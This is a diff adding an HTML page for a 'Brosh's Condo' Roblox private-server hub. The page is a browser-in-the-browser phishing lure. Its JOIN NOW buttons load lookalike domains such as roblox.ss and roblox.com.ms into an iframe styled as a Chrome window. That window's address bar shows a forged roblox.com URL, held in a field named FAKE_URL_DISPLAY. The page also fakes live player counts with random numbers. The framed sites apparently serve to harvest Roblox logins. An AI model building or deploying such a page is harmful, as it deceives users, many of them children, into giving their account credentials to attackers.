@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>BROSH'S CONDO - Virtual Condo Games Hub</title>
+    <link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
+    <link rel="apple-touch-icon" href="/icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Inter:ital,opsz,wght@0,14..32,400..900;1,14..32,400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @media(prefers-reduced-motion:reduce){*{animation-duration:.001ms!important;transition-duration:.06ms!important;}.livedot{animation:none;}}
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        html { scroll-behavior: smooth; }
+        body { background: var(--bg); color: var(--ink); font-family: var(--font-b); line-height: 1.6; -webkit-font-smoothing: antialiased; overflow-x: hidden; min-height: 100vh; }
+        a { color: inherit; text-decoration: none; }
+        button { padding: 0; border: 0; color: inherit; background: none; font: inherit; cursor: pointer; }
+        svg, img { display: block; max-width: 100%; }
+        .wrap { width: min(1240px, 92vw); margin-inline: auto; }
+
+        :root{
+            --bg:#0f040b; --bg-2:#1f0a14; --surface:#2e1121; --surface-2:#421d30;
+            --line:rgba(220,122,184,.18); --line-bright:rgba(255,122,216,.45);
+            --ink:#f8eaf1; --ink-dim:#d6b2c8; --ink-faint:#9e708c;
+            --pink-primary:#f755a8; --pink-bright:#fc84c0;
+            --pink-accent:#ec4899; --pink-accent-bright:#f472b6;
+            --cyan-accent:#1ffff7; --gold-accent:#ffdf4d; --green:#4fd88a;
+            --shadow:0 24px 60px -20px rgba(30,2,10,.95);
+            --font-d:"Chakra Petch",system-ui,sans-serif;
+            --font-b:"Inter",system-ui,sans-serif;
+            --glow-color: rgba(247,85,168,.6);
+            --glass-grad: linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, rgba(255, 255, 255, 0.1) 50%, rgba(255, 255, 255, 0.05) 51%, rgba(255, 255, 255, 0.2) 100%);
+            --button-grad: linear-gradient(135deg, var(--pink-primary) 0%, var(--pink-accent) 100%);
+        }
+
+        video { filter: hue-rotate(270deg) contrast(1.1); }
+        .server-thumb img { filter: hue-rotate(270deg) contrast(1.1) brightness(0.9); }
+
+        #loading-screen {
+            position: fixed; inset: 0; z-index: 99999;
+            background: radial-gradient(circle at 50% 50%, #360b1a, #07040f 90%);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            opacity: 1; visibility: visible;
+            transition: opacity 0.8s cubic-bezier(0.16, 1, 0.3, 1), transform 0.8s cubic-bezier(0.16, 1, 0.3, 1), visibility 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        #loading-screen.fade-out { opacity: 0; transform: scale(1.05); visibility: hidden; pointer-events: none; }
+        .loader-grid-orbit { position: relative; width: 110px; height: 110px; display: flex; align-items: center; justify-content: center; }
+        .loader-ring-outer { position: absolute; inset: 0; border-radius: 50%; border: 2px dashed rgba(236,72,153,0.3); animation: spin 8s linear infinite; }
+        .loader-ring-inner { position: absolute; inset: 12px; border-radius: 50%; border: 2px solid transparent; border-top: 2px solid var(--pink-accent-bright); border-bottom: 2px solid var(--pink-bright); animation: spin-reverse 1.5s linear infinite; }
+        .loader-core { width: 50px; height: 50px; background: linear-gradient(135deg, var(--pink-primary), var(--pink-accent)); border-radius: 14px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 35px rgba(236,72,153,0.7); animation: pulse-core 2s ease-in-out infinite; }
+        .loader-core i { font-size: 20px; color: #fff; filter: drop-shadow(0 0 6px rgba(255,255,255,0.8)); }
+        @keyframes pulse-core { 0%, 100% { transform: scale(0.95); box-shadow: 0 0 25px rgba(247,85,168,0.5); } 50% { transform: scale(1.08); box-shadow: 0 0 45px rgba(236,72,153,0.9); } }
+        .loading-title { margin-top: 28px; font-weight: 700; font-size: 19px; letter-spacing: 3px; font-family: var(--font-d); }
+        .loading-title span { color: var(--pink-accent-bright); text-shadow: 0 0 20px rgba(236,72,153,0.6); }
+        .loading-bar-track { width: 260px; height: 5px; background: rgba(255,255,255,0.06); border-radius: 6px; margin-top: 18px; overflow: hidden; border: 1px solid rgba(220,122,184,0.15); }
+        .loading-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--pink-primary), var(--pink-accent), var(--cyan-accent)); border-radius: 6px; transition: width 0.25s ease-out; box-shadow: 0 0 12px var(--pink-accent); }
+        .loading-text { font-size: 12px; color: var(--ink-dim); margin-top: 12px; letter-spacing: 1px; font-family: var(--font-d); }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+
+        #app-content { opacity: 0; transform: translateY(20px); transition: opacity 0.9s cubic-bezier(0.16, 1, 0.3, 1), transform 0.9s cubic-bezier(0.16, 1, 0.3, 1); padding-bottom: 40px; }
+        #app-content.visible { opacity: 1; transform: translateY(0); }
+
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: rgba(31,10,20,0.75); backdrop-filter: blur(16px); border-bottom: 1px solid var(--line); position: sticky; top: 0; z-index: 100; }
+        .nav-brand { display: flex; align-items: center; gap: 10px; font-family: var(--font-d); font-weight: 700; font-size: 1rem; letter-spacing: 0.5px; }
+        .brand-icon { width: 30px; height: 30px; background: linear-gradient(135deg, var(--pink-primary), var(--pink-accent)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 0.9rem; box-shadow: 0 0 16px rgba(247,85,168,0.5); flex-shrink: 0; }
+        .nav-brand span span { color: var(--pink-accent-bright); }
+        .nav-actions { display: flex; gap: 8px; align-items: center; }
+
+        .hero { position: relative; min-height: 70svh; display: flex; flex-direction: column; justify-content: center; overflow: hidden; padding: 50px 0 40px; }
+        .hero-bg { position: absolute; inset: 0; z-index: 0; background: linear-gradient(rgba(31,10,20,.75),rgba(31,10,20,.95)), url("https://broshs-condo.io/gallery/pink-nebula.gif") center/cover no-repeat, var(--bg); }
+        .grid-floor { position: absolute; left: 50%; bottom: -6%; translate: -50% 0; width: 230%; height: 60%; z-index: 0; background-image: linear-gradient(var(--line-bright) 1px,transparent 1px), linear-gradient(90deg,var(--line-bright) 1px,transparent 1px); background-size: 48px 48px; transform: perspective(560px) rotateX(64deg); transform-origin: bottom center; mask-image: linear-gradient(to top,#000 6%,transparent 78%); }
+        .hero-inner { position: relative; z-index: 2; }
+        .eyebrow { display: inline-flex; align-items: center; gap: 8px; font-family: var(--font-d); font-weight: 600; font-size: .75rem; letter-spacing: .12em; color: var(--pink-accent-bright); padding: 6px 12px; border: 1px solid var(--line-bright); border-radius: 999px; background: rgba(236,72,153,.08); margin-bottom: 18px; }
+        .eyebrow .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--pink-accent-bright); animation: pulse 2s infinite; }
+        @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(236,72,153,.6)} 70%{box-shadow:0 0 0 10px rgba(236,72,153,0)} 100%{box-shadow:0 0 0 0 rgba(236,72,153,0)} }
+        h1.title { font-family: var(--font-d); font-weight: 700; line-height: 1.05; font-size: clamp(2.1rem, 6.5vw, 4.2rem); letter-spacing: -.01em; max-width: 16ch; margin-bottom: 16px; }
+        h1.title .glow { color: var(--pink-bright); text-shadow: 0 0 30px rgba(247,85,168,.6); }
+        .lede { font-size: clamp(0.95rem, 1.8vw, 1.12rem); color: var(--ink-dim); max-width: 52ch; margin-bottom: 26px; }
+        .cta-row { display: flex; flex-wrap: wrap; gap: 10px; }
+        .btn { font-family: var(--font-d); font-weight: 600; font-size: 0.9rem; padding: 12px 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: transform .18s, box-shadow .18s, background .18s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; text-align: center; }
+        .btn-primary, .join-btn { background: var(--glass-grad), var(--button-grad); color: #fff; box-shadow: inset 0 1px 1px rgba(255,255,255,0.6), inset 0 -1px 1px rgba(0,0,0,0.2), 0 8px 20px -6px rgba(247,85,168,0.7); width: 100%; }
+        .btn-ghost { background: rgba(255,255,255,.03); border-color: var(--line-bright); color: var(--ink); flex: 1; min-width: 130px; }
+        .btn-discord { background: #5865F2; color: #fff; box-shadow: 0 8px 20px -6px rgba(88,101,242,0.7); border-color: #5865F2; flex: 1; min-width: 130px; }
+        .btn:active { transform: scale(0.97); }
+        .hero-banner { margin: 24px 0 0; background: linear-gradient(145deg, rgba(66,29,48,0.75), rgba(31,10,20,0.95)); border-radius: 16px; border: 1px solid var(--line-bright); overflow: hidden; box-shadow: var(--shadow); }
+        .hero-video-wrapper { position: relative; width: 100%; height: 200px; background: var(--bg-2); overflow: hidden; }
+        .hero-video-wrapper video { width: 100%; height: 100%; object-fit: cover; opacity: 0.75; display: block; }
+        .live-badge { position: absolute; top: 12px; left: 14px; background: var(--pink-accent); color: white; font-size: 9px; font-weight: 700; padding: 4px 10px; border-radius: 6px; letter-spacing: 0.6px; z-index: 5; box-shadow: 0 0 10px rgba(236,72,153,0.6); font-family: var(--font-d); }
+        .hero-avatar-overlay { position: absolute; bottom: 12px; left: 12px; display: flex; align-items: center; gap: 8px; z-index: 5; background: rgba(30,2,10,0.75); backdrop-filter: blur(6px); padding: 4px 12px 4px 6px; border-radius: 30px; border: 1px solid var(--line-bright); }
+        .hero-avatar-img { width: 30px; height: 30px; border-radius: 50%; border: 2px solid var(--pink-bright); object-fit: cover; background: var(--surface); }
+        .hero-avatar-name { font-size: 11px; font-weight: 600; color: #f8f9fa; font-family: var(--font-d); }
+        .hero-content { padding: 16px; }
+        .hero-content h2 { font-size: 1.1rem; font-weight: 700; font-family: var(--font-d); margin-bottom: 4px; color: var(--ink); }
+        .hero-content p { font-size: 0.85rem; color: var(--ink-dim); }
+    </style>
+</head>
+<body>
+      <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loader-grid-orbit">
+            <div class="loader-ring-outer"></div>
+            <div class="loader-ring-inner"></div>
+            <div class="loader-core"><i class="fa-solid fa-atom"></i></div>
+        </div>
+        <div class="loading-title">BROSH'S <span class="highlight">SECURE GATEWAY</span></div>
+        <div class="loading-bar-track">
+            <div class="loading-bar-fill" id="loading-bar"></div>
+        </div>
+        <div class="loading-text" id="loading-text">Initializing Nodes...</div>
+    </div>
+
+    <div id="app-content">
+        <header class="navbar">
+            <div class="nav-brand">
+                <div class="brand-icon"><i class="fa-solid fa-hotel"></i></div>
+                <span>BROSH'S <span>CONDO HUB</span></span>
+            </div>
+            <div class="nav-actions">
+                <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord" style="padding: 6px 12px; font-size: 0.75rem;"><i class="fa-brands fa-discord"></i> Discord</a>
+            </div>
+        </header>
+
+        <header class="hero">
+            <div class="hero-bg"></div>
+            <div class="grid-floor"></div>
+            <div class="wrap hero-inner">
+                <div class="eyebrow"><span class="dot"></span> COOL PINK NETWORK v5.0</div>
+                <h1 class="title">Next-Gen <span class="glow">BROSH'S CONDO</span> Virtual Hub</h1>
+                <p class="lede">Explore elite interactive private servers, stunning cool pink aesthetics, and curated virtual environments built with absolute optimization.</p>
+                <div class="cta-row">
+                    <button class="btn btn-primary" onclick="launchPrimaryServer()">Launch Main Suite</button>
+                    <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord"><i class="fa-brands fa-discord"></i> Join Discord</a>
+                </div>
+
+                <div class="hero-banner">
+                    <div class="hero-video-wrapper">
+                        <span class="live-badge"><i class="fa-solid fa-signal" style="font-size:7px; margin-right:3px; vertical-align:middle;"></i> SECURE STREAM</span>
+                        <video autoplay loop muted playsinline>
+                            <source src="https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/vidio.mp4" type="video/mp4">
+                        </video>
+                        <div class="hero-avatar-overlay">
+                            <img class="hero-avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="avatar">
+                            <span class="hero-avatar-name">BroshHost_01</span>
+                        </div>
+                    </div>
+                    <div class="hero-content">
+                        <h2>Featured condo Node Live Broadcast</h2>
+                        <p>Instant redirection protocols enabled for all active private server clusters.</p>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <section class="stats">
+            <div class="wrap">
+                <div class="stats-grid">
+                    <div class="stat"><div class="num" id="totalActivePlayers">32,450</div><div class="lbl">ACTIVE PLAYERS</div></div>
+                    <div class="stat"><div class="num" id="totalServersOnline">9 / 9</div><div class="lbl">SERVERS ONLINE</div></div>
+                    <div class="stat"><div class="num">99.9%</div><div class="lbl">STABILITY INDEX</div></div>
+                    <div class="stat"><div class="num">5.0★</div><div class="lbl">GALAXY RATING</div></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="sec" id="hub-section">
+            <div class="wrap">
+                <div class="sec-head">
+                    <div>
+                        <h2>Expanded condo Grid</h2>
+                        <p>Select any node below to deploy instantly.</p>
+                    </div>
+                    <div class="section-stats">
+                        Total Online: <span id="onlineCount">118</span> Players
+                    </div>
+                </div>
+
+                <div class="server-list" id="serverGridContainer"></div>
+            </div>
+        </section>
+
+        <footer>
+            <div class="wrap foot-in">
+                <div>
+                    <div class="brand"><div class="mk"><i class="fa-solid fa-hotel"></i></div> Brosh's Condo Games</div>
+                    <p style="margin-top: 6px;">Unified interface build combining high performance visual arrays and secure client wrappers.</p>
+                </div>
+                <div class="foot-links">
+                    <a href="https://discord.gg/VEMNjavWzP" target="_blank" rel="noopener noreferrer" class="btn btn-discord" style="padding: 10px 14px; font-size: 0.8rem;"><i class="fa-brands fa-discord"></i> Discord</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h3 id="loadingTitle">Connecting...</h3>
+            <p id="loadingText">Establishing secure node tunnel</p>
+        </div>
+    </div>
+
+    <div id="browserModal" class="browser-modal-overlay">
+        <div class="chrome-window">
+            <div class="chrome-titlebar">
+                <div class="chrome-tabs">
+                    <div class="chrome-tab active">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" class="chrome-tab-icon" id="modalTabIcon" alt="Logo">
+                        <span class="chrome-tab-title" id="modalTabTitle">Session Window</span>
+                        <span class="chrome-tab-close" id="closeTabBtn">&times;</span>
+                    </div>
+                </div>
+                <div class="chrome-window-controls">
+                    <span class="chrome-close-btn" id="closeBrowserBtn">&#10005;</span>
+                </div>
+            </div>
+            <div class="chrome-toolbar">
+                <div class="chrome-nav-btns">
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"></path></svg>
+                </div>
+                <div class="chrome-address-bar">
+                    <svg viewBox="0 0 24 24" class="chrome-lock"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://roblox.com/...</span></span>
+                </div>
+            </div>
+            <div class="browser-content">
+                <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"></iframe>
+            </div>
+        </div>
+  </div>
+      <script>
+        const appConfig = {
+            discordUrl: "https://discord.gg/VEMNjavWzP", 
+            servers: [
+                {
+                    id: "srv_01",
+                    name: "Brosh Condo 01: Neon Nebula Lounge",
+                    desc: "High-tier vip lounge with customized audio visual presets & low latency.",
+                    currentPlayers: 18, maxPlayers: 20, ping: "14ms",
+                    thumb: "https://cdn.phototourl.com/free/2026-08-18-bdb0bb97-e60c-4b69-adfb-f6415f0ef31e.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://www.roblox.ss/games/95051309591921/Talk-to-AI-Yumiko?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_02",
+                    name: "Brosh Condo 02: Stellar Suite",
+                    desc: "Expanded cluster optimized for heavy user traffic and seamless load-balancing.",
+                    currentPlayers: 14, maxPlayers: 20, ping: "22ms",
+                    thumb: "https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/server2.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://roblox.com.ms/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=56987585516370817668187404461166",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_03",
+                    name: "Brosh Condo 03: Void Astral Realm",
+                    desc: "Immersive cool pink ambience configured with custom private server rules.",
+                    currentPlayers: 19, maxPlayers: 20, ping: "18ms",
+                    thumb: "https://cdn.phototourl.com/free/2026-08-18-bdb0bb97-e60c-4b69-adfb-f6415f0ef31e.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://www.roblox.ss/games/14153443454/Meet-a-neko?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_04",
+                    name: "Brosh Condo 04: Cyber Matrix Grid",
+                    desc: "Futuristic layout featuring high definition shaders and rapid connection channels.",
+                    currentPlayers: 12, maxPlayers: 20, ping: "26ms",
+                    thumb: "https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/server2.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-456E27ADA99A21CADD2590306EE214A6-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://roblox.com.ms/games/18365686347/shutting-down?privateServerLinkCode=56987585516370817668187404461166",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_05",
+                    name: "Brosh Condo 05: Supernova Sanctuary",
+                    desc: "Exclusive VIP realm featuring priority queuing and enhanced bandwidth allocation.",
+                    currentPlayers: 20, maxPlayers: 20, ping: "11ms",
+                    thumb: "https://cdn.phototourl.com/free/2026-08-18-bdb0bb97-e60c-4b69-adfb-f6415f0ef31e.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://www.roblox.ss/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_06",
+                    name: "Brosh Condo 06: Eclipse Cluster",
+                    desc: "Fully encrypted secure node instance with automated synchronization loops.",
+                    currentPlayers: 15, maxPlayers: 20, ping: "19ms",
+                    thumb: "https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/server2.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-456E27ADA99A21CADD2590306EE214A6-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://roblox.com.ms/games/84818699017739/Weird-Neko-Game?privateServerLinkCode=56987585516370817668187404461166",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_07",
+                    name: "Brosh Condo 07: Quantum Portal",
+                    desc: "Low-latency sub-space routing designed for maximum FPS and smooth avatar rendering.",
+                    currentPlayers: 16, maxPlayers: 20, ping: "15ms",
+                    thumb: "https://cdn.phototourl.com/free/2026-08-18-bdb0bb97-e60c-4b69-adfb-f6415f0ef31e.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-456E27ADA99A21CADD2590306EE214A6-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://www.roblox.ss/games/124331793246454/UwUs-Tower?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_08",
+                    name: "Brosh Condo 08: Cyber Pavilion",
+                    desc: "Vibrant neon-lit social environment featuring real-time audio sync protocols.",
+                    currentPlayers: 17, maxPlayers: 20, ping: "21ms",
+                    thumb: "https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/server2.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://roblox.com.ms/games/139691978713085/Obsessed?privateServerLinkCode=56987585516370817668187404461166",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                },
+                {
+                    id: "srv_09",
+                    name: "Brosh Condo 09: Andromeda VIP Lounge",
+                    desc: "Ultra-fast direct connection node reserved for priority hub members.",
+                    currentPlayers: 13, maxPlayers: 20, ping: "12ms",
+                    thumb: "https://cdn.phototourl.com/free/2026-08-18-bdb0bb97-e60c-4b69-adfb-f6415f0ef31e.jpg",
+                    avatars: [
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter",
+                        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E5988C142C147FC9D3D0DA0C7736C712-Png/150/150/AvatarHeadshot/Webp/noFilter"
+                    ],
+                    PRIVATE_SERVER_URL: "https://www.roblox.ss/games/71007326530715/AI-Town?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/launch/broshs-condo"
+                }
+            ]
+        };
+
+        document.addEventListener("DOMContentLoaded", () => {
+            renderServers();
+            startLoadingSequence();
+        });
+
+        function renderServers() {
+            const gridContainer = document.getElementById('serverGridContainer');
+            if (!gridContainer) return;
+            gridContainer.innerHTML = '';
+
+            appConfig.servers.forEach((srv) => {
+                let avatarsHtml = srv.avatars.map(av => `<img class="player-avatar-sm" src="${av}" alt="p">`).join('');
+                const card = document.createElement('div');
+                card.className = 'server-card';
+                card.innerHTML = `
+                    <div class="server-thumb">
+                        <span class="available-tag"><i class="fa-solid fa-circle" style="font-size:6px; color:var(--pink-accent-bright);"></i> ONLINE</span>
+                        <span class="server-ping"><i class="fa-solid fa-wifi" style="font-size:9px;"></i> ${srv.ping}</span>
+                        <img src="${srv.thumb}" alt="${srv.name}">
+                    </div>
+                    <div class="server-info">
+                        <div class="server-name">${srv.name}</div>
+                        <div class="server-desc">${srv.desc}</div>
+                        <div class="player-strip">
+                            <div class="player-avatars-group">${avatarsHtml}</div>
+                            <span class="player-count-label" id="player-count-${srv.id}">${srv.currentPlayers} / ${srv.maxPlayers} Players</span>
+                        </div>
+                        <button class="join-btn" onclick="openServer('${srv.id}')">JOIN NOW</button>
+                    </div>
+                `;
+                gridContainer.appendChild(card);
+            });
+        }
+
+        function startLoadingSequence() {
+            const bar = document.getElementById('loading-bar');
+            const text = document.getElementById('loading-text');
+            const screen = document.getElementById('loading-screen');
+            const app = document.getElementById('app-content');
+            let progress = 0;
+            
+            const stages = [
+                "Establishing Quantum Link...",
+                "Bypassing Security Gateways...",
+                "Syncing Node Clusters...",
+                "Launching Brosh Suite..."
+            ];
+
+            const interval = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    screen.classList.add('fade-out');
+                    app.classList.add('visible');
+                    setTimeout(() => { screen.style.display = 'none'; }, 850);
+                } else {
+                    progress += Math.floor(Math.random() * 8) + 4;
+                    if (progress > 100) progress = 100;
+                    bar.style.width = progress + '%';
+                    let stageIdx = Math.floor((progress / 100) * stages.length);
+                    if (stageIdx >= stages.length) stageIdx = stages.length - 1;
+                    text.innerText = `${stages[stageIdx]} [${progress}%]`;
+                }
+            }, 60);
+        }
+
+        (function() {
+            const onlineEl = document.getElementById('onlineCount');
+            const totalActiveEl = document.getElementById('totalActivePlayers');
+
+            setInterval(() => {
+                appConfig.servers.forEach(srv => {
+                    const change = Math.floor(Math.random() * 3) - 1;
+                    srv.currentPlayers += change;
+                    if (srv.currentPlayers < 9) srv.currentPlayers = 9;
+                    if (srv.currentPlayers > srv.maxPlayers) srv.currentPlayers = srv.maxPlayers;
+                    const label = document.getElementById(`player-count-${srv.id}`);
+                    if (label) { label.innerText = `${srv.currentPlayers} / ${srv.maxPlayers} Players`; }
+                });
+
+                if (onlineEl) {
+                    let currentVal = parseInt(onlineEl.innerText) + (Math.floor(Math.random() * 5) - 2);
+                    if (currentVal < 110) currentVal = 110;
+                    if (currentVal > 125) currentVal = 125;
+                    onlineEl.innerText = currentVal;
+                }
+
+                if (totalActiveEl) {
+                    let currentTotal = parseInt(totalActiveEl.innerText.replace(',', '')) + (Math.floor(Math.random() * 15) - 7);
+                    totalActiveEl.innerText = currentTotal.toLocaleString();
+                }
+            }, 3000);
+        })();
+
+        function launchPrimaryServer() { openServer('srv_01'); }
+
+        function openServer(serverId) {
+            const serverData = appConfig.servers.find(s => s.id === serverId);
+            if (!serverData) return;
+            const loadingModal = document.getElementById('loadingModal');
+            document.getElementById('loadingText').innerText = `Connecting to ${serverData.name}...`;
+            loadingModal.classList.add('active');
+            
+            setTimeout(() => {
+                loadingModal.classList.remove('active');
+                showBrowserModal(serverData.PRIVATE_SERVER_URL, serverData.name, 'roblox', serverData.FAKE_URL_DISPLAY);
+            }, 800);
+        }
+
+        function showBrowserModal(targetUrl, titleText, type, displayUrl) {
+            const modal = document.getElementById('browserModal');
+            const iframe = document.getElementById('browserIframe');
+            iframe.src = targetUrl;
+            document.getElementById('modalTabTitle').innerText = titleText;
+            document.getElementById('modalTabIcon').src = 'https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg';
+            document.getElementById('fakeUrlText').innerHTML = `<span class="chrome-url-dim">https://</span>${displayUrl.replace(/^https?:\/\//, '')}`;
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeChromeModal() {
+            const modal = document.getElementById('browserModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = '';
+            document.getElementById('browserIframe').src = 'about:blank';
+        }
+
+        document.getElementById('closeBrowserBtn').addEventListener('click', closeChromeModal);
+        document.getElementById('closeTabBtn').addEventListener('click', closeChromeModal);
+        document.getElementById('browserModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('browserModal')) { closeChromeModal(); }
+        });
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && document.getElementById('browserModal').classList.contains('active')) { closeChromeModal(); }
+        });
+    </script>
+</body>
+</html>
